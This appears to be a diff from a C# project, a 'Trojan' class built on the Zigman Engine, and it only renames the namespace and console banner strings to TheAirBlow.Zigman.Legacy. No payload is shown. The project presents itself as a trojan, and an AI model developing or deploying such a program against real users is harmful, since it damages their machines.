@@ -7,7 +7,7 @@ using System.Diagnostics;
 using System.Drawing;
 using System.Windows.Forms;
 
-namespace Zigman.Engine.Legacy;
+namespace TheAirBlow.Zigman.Legacy;
 
 public partial class Trojan
 {
@@ -51,9 +51,9 @@ public partial class Trojan
     
     public void Start()
     {
-        Console.Title = "Zigman.Engine.Legacy | Warning";
+        Console.Title = "TheAirBlow.Zigman.Legacy | Warning";
         Console.WriteLine("/------------------------------------\\");
-        Console.WriteLine("| Zigman.Engine.Legacy | Made by TheAirBlow |");
+        Console.WriteLine("| TheAirBlow.Zigman.Legacy | Made by TheAirBlow |");
         Console.WriteLine("|   A trojan running Zigman Engine   |");
         Console.WriteLine("\\------------------------------------/");
         Console.WriteLine($"\"{Configuration.Name}\" made by {Configuration.Creator}");
@@ -174,9 +174,9 @@ public partial class Trojan
         
         Beep(700, 100);
         Console.Clear();
-        Console.Title = "Zigman.Engine.Legacy | Running";
+        Console.Title = "TheAirBlow.Zigman.Legacy | Running";
         Console.WriteLine("/------------------------------------\\");
-        Console.WriteLine("| Zigman.Engine.Legacy | Made by TheAirBlow |");
+        Console.WriteLine("| TheAirBlow.Zigman.Legacy | Made by TheAirBlow |");
         Console.WriteLine("|   A trojan running Zigman Engine   |");
         Console.WriteLine("\\------------------------------------/");
         Console.WriteLine($"[Info] Creator: {Configuration.Creator}");
